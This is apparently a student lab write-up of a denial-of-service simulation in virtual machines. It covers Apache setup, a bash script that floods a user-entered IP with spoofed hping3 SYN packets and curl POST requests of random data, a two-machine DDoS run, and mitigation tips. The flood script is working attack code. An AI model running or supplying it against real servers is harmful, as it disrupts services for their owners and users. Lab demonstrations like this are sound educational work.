# Denial of Service

## Main Objectives 
The objective of the project is to raise awareness of how easy such an attack be to execute and also to educate on ways to mitigate and protect a network from a Denial of Service attack.

## What is DoS
DoS or Denial of Service attack is a threat actor's attempt to make a certain network resource become completely unavailable to its intended users by sending a significant amount of traffic to it. For example in this project by using a few simple Linux commands such as hping3 or even curl, the attacker managed to send enough traffic to slow down the target's system.

## DDos vs DoS
DDoS is a more sever form of Denial of Service because it doesn't come from just one source/attacker but from multiple all at once which makes this type of attack more efficient than the other version.

## Key Components
**VMware**
To simulate this attack in a controlled environment, VMware has been used.
VMware is a type 2 hypervisor, which means it runs on top of the host OS. This results into the virtual machines to rely on the host OS to manage resources.

**Kali Linux**
Kali Linux is a Debian-based Linux distribution used to perform advanced penetration testing and security auditing.

**Sparky Linux**
Sparky Linux is also a Debian-based Linux distro, but in the case of project it acts as the target web server.

**Lubuntu Linux**
Lubuntu is based on Ubuntu, but it's a lightweight version of it. This machine has been used to demonstrate the DDoS attack.

## Setup

# Web Server
First, the web server had to be created and to do so the following commands were used in Sparky Linux:

Install the Apache2 service:
```bash
sudo apt update
sudo apt install apache2
```

Start the service:
```bash
sudo systemctl start apache2
sudo systemctl enable apache2
```

Check service status:
```bash
sudo systemctl status apache2
```

Create a simple web page:
```bash
sudo nano /var/www/html/index.html
```

Reload service:
```bash
sudo systemctl reload apache2
```

<!-- Site Template Img -->
![Website's Interface](ddos/ddos_imgs/site_template.jpg)

# Script
After the server has been setup, a custom script has been created. This script allows the user to input the target's IP, the amount of TCP SYN messages and number of POST requests to be sent. In a real scenario there would probably be no maximum number of traffic that should be forwarded to the target, but in the case of the current experiment it wasn't necessary.

```bash
#!/bin/bash
# Target information
read -p „Target IP: ” target_ip
read -p „Number of TCP SYN messages: ” syn_msgs read -p „Number of POST requests: ” requests

# Initiating the attack
for ((i=1; i<=syn_msgs; i++)); do
hping3 -S -p 80 --flood --rand-source $target_ip > /dev/null 2>&1
& done

for ((i=1; i<=requests; i++)); do
curl -X POST -d ‘$(head -c 10000 </dev/urandom | base64)’ http://$target_ip:80 > /dev/null 2>&1 &
done
#print a message that the attack is finished echo „Attack completed!”
```

# Threat Actors
For the DDoS part of the simulation, to send traffic from multiple sources, the Kali machine was connected via netcat to the Lubuntu machine.

## Attack Execution
To perform the attack, the script was first run only from Kali to observe the target's behavior. The objective was to check if one source of attack would be enough to stall or slow down the target system, which wasn't. But as soon as the second source, Lubuntu, also started sending requests, a spike in terms of CPU and memory usage was identified.
Due to hardware limitations the experiment couldn't continue because it was taking a toll on the physical host.
<!--Before Attack Img-->
![Resource Usage Before the Attack](ddos/ddos_imgs/before_attack.jpg)
<!--After Attack Img-->
![Resource Usage After the Attack](ddos/ddos_imgs/after_attack.jpg)
## Conclusions

# Objective
Though there were hardware limitations on the physical host, the experiment achieved it's objective, that being to demonstrate how easy an attack like this can be to executed.

# Mitigation Techniques
In order to mitigate a DoS or DDoS attack the following mitigation techniques can be implemented:
1. Rate-limiting to allow only a certain number of web requests per second.
2. Using a reverse proxy which can absorb attack traffic before reaching the server
3. Blocking traffic coming from a specific range of IPs via ACL rules or Firewall
4. Enable SYN flood protection for TCP-based attacks
